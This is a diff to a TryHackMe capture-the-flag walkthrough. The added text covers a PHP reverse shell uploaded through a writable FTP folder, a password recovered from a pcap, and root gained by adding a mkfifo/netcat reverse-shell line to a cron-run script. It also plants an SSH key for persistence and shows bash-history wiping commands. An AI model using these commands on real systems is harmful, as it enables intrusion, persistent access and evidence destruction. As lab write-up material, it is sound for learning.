@@ -73,12 +73,42 @@ Also see: [nikto.log](nikto.log)
 
 ### Unprivileged Access
 
-TBD
+Since the anonymous FTP folder `/ftp/` is writeable, you can do a `put revshell.php` into that folder, and then execute that reverse shell from the `/files/revshell.php` URL in the browser.
+
+That will get you a primitive shell running as the `www-data` user.
+
+### Privilege Escalation (power user)
+
+First, to privesc into the `lennie` account (you can see their home folder under `/home/`), look in the `incidents` folder for a pcap file. If you download that file and view it with Wireshark, you can see there was a password attempt. It was a bad password attempt for `www-data`, but that IS the password for `lennie`.
+
+Meaning, you can now do `su - lennie` with that newly found password. You are now logged-in as `lennie`.
+
+### Privilege Escalation (root)
+
+The Hint from TryHackMe for root privesc is "scripts". Well, in Lennie's home folder there is a `~/scripts/` folder. In there is a bash script that calls `/etc/print.sh`. In short, it looks like something external kicks off that script, but we don't know what it is.
+
+So, we modify `/etc/print.sh` to reverse shell back to our workstation by adding something like:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
+```
+
+and then listen on your workstation with something like this:
+
+```bash
+nc -lvnp 8080
+```
+
+After a minute or so, you've got a prompt, and it's a root prompt!
 
 
 ## Maintaining Access
 
-TBD
+To not have to deal with half-broken shells, I added my SSH public key to `/home/lennie/.ssh/authorized_keys` and set the permissions on that file to `chmod 600 ./authorized_keys`. That way, instead of working out of reverse shells with bad rendering, I could now just:
+
+```bash
+ssh lennie@x.x.x.x
+```
 
 ## Clearing Tracks
 
@@ -96,10 +126,8 @@ This is a test machine. However, in a Red Team scenario, we could:
 
 > `cat /dev/null > /root/.bash_history`
 >  
-> `cat /dev/null > /home/kathy/.bash_history`
->  
-> `cat /dev/null > /home/sam/.bash_history`
+> `cat /dev/null > /home/lennie/.bash_history`
 
 ## Summary
 
-Completed: [<kbd>CTRL</kbd>+<kbd>SHFT</kbd>+<kbd>I</kbd>]
+Completed: [2023-07-20 21:01:11]
